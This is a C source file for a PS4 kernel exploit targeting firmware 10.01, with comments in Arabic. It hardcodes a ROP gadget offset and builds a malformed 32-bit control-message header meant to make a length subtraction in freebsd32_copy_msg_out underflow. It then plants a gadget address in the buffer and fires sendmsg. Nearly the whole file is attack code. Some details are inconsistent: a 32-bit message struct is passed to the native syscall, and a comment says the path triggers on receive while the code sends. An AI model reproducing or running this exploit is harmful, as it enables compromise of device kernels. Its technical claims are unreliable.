#include <ps4.h>
#include <stdint.h>
#include <string.h>

// --- الإزاحات (Offsets) لنسخة 10.01 ---
// اخترنا هذا الـ Gadget لأنه يسهل رصد التغير في السجلات
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

// تعريف الهياكل المتوافقة مع 32-بت كما في الملف المصدر
struct cmsghdr32 {
    uint32_t cmsg_len;   // الطول
    int      cmsg_level; // البروتوكول
    int      cmsg_type;  // النوع
};

struct msghdr32 {
    uint32_t msg_name;
    uint32_t msg_namelen;
    uint32_t msg_iov;
    uint32_t msg_iovlen;
    uint32_t msg_control;
    uint32_t msg_controllen;
    int      msg_flags;
};

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];

int _main(struct thread *td) {
    // 1. تهيئة المكتبات الأساسية
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    uint64_t trigger_gadget = kbase + OFF_PUSH_RSP_POP_RSI_RET;

    // 2. إعداد الـ Socket
    // استخدام AF_INET و SOCK_DGRAM (UDP) لتفعيل مسار معالجة الرسائل
    int sock = syscall(97, 2, 2, 0); 
    if (sock < 0) return -1;

    // 3. تجهيز الـ Buffer الملغوم
    memset(control_buf, 0, CONTROL_LEN);

    // إعداد أول هيكل رسالة
    struct cmsghdr32 *cmsg = (struct cmsghdr32 *)control_buf;
    
    /* الخدعة الحسابية:
       نضع cmsg_len = 9. 
       في النواة: sizeof(struct cmsghdr32) غالباً ما يكون 12 بايت.
       الدالة ستجعل copylen = 9 بايت.
       ثم تنفذ: ctlbuf += ALIGN(9) أي ctlbuf += 12.
       وتنفذ: len -= ALIGN(9) أي 11 - 12 = -1 (Underflow).
    */
    cmsg->cmsg_len = 9; 
    cmsg->cmsg_level = 0; // IPPROTO_IP
    cmsg->cmsg_type = 7;  // IP_RETOPTS

    // 4. وضع الـ ROP Chain عند نقطة "الرسالة الوهمية الثانية"
    // بما أن التراصف الخاطئ سيقفز بنا إلى الإزاحة 12، نضع عنواننا هناك
    *(uint64_t *)(control_buf + 12) = trigger_gadget;

    // 5. إعداد ترويسة الرسالة (The Master Trigger)
    struct msghdr32 msg = {0};
    msg.msg_control = (uintptr_t)control_buf;
    
    // نحدد الطول الكلي بـ 11 كما اقترحت لكسر عملية الطرح في النواة
    msg.msg_controllen = 11; 

    // 6. طلقة واحدة للتنفيذ (بدون Race)
    // نحن نستخدم syscall(27) لـ recvmsg أو syscall(28) لـ sendmsg
    // في حالة freebsd32_copy_msg_out، يتم استدعاؤها غالباً عند استقبال رسائل
    syscall(28, sock, &msg, 0);

    // تنظيف
    syscall(6, sock);

    return 0;
}
